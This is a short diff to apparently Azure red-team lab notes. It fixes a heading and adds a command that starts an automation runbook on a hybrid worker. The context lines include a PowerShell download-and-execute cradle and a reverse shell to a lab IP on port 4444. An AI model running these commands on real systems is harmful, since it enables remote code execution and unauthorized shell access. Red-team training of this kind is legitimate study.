@@ -1284,14 +1284,14 @@ IEX (New-Object Net.Webclient).downloadstring("http://172.16.150.38:82/Invoke-Po
 reverse -Reverse -IPAddress 172.16.150.38 -Port 4444
 ```
 
-#### Public the automation runbook to the vm
+#### Publish the automation runbook to the vm
 ```
 Publish-AzAutomationRunbook -RunbookName student38 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
 ```
 
-####
+#### Start the runbook
 ```
-
+Start-AzAutomationRunbook -RunbookName student38 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
 ```
 
 ####
